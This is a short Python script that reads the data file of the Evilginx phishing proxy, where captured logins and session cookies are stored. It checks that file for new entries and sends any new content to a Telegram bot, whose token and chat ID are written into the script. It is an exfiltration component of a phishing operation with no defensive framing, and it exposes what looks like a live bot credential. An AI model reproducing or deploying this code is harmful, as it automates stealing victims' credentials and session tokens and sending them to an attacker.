file_path = '/root/.evilginx/data.db'
file_useano="subtitute.txt"
file_content1=''
file_content2=''
toreplace=''
replay=''

TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
CHAT_ID='7284568121'

import requests

with open(file_path, 'r') as file:
    file_content1 = file.read() 
    replay=file_content1
    toreplace=file_content1
    file.close()
print(file_content1)

with open(file_useano, 'r') as file:
    file_content2 = file.read()
    file.close()
print(file_content2)

if file_content1 != file_content2:
  with open(file_useano, 'w') as file:
     message=toreplace.replace(file_content2, '')
     file.write(toreplace)
     file.close()
     url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
     requests.get(url)
     
  
  


  



print("DONE")

  